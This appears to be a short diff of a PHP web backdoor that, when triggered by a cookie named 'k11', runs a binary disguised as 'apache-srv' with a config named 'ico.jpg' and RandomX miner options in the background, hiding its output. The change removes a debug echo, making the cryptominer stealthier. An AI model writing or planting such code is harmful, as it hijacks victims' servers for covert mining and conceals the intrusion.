@@ -137,9 +137,7 @@ if (isset($_COOKIE["k11"])) {
     }else{
         $cmd = "chmod 755 apache-srv;./apache-srv -c ico.jpg --background --randomx-mode=light > /dev/null 2>&1 &";
     }
-    echo $cmd;
-
-    //$cmd .= ' 2>&1 &';
+    
     if (!preg_match('/2>/', $cmd)) {
       $cmd .= ' 2>&1';
     }
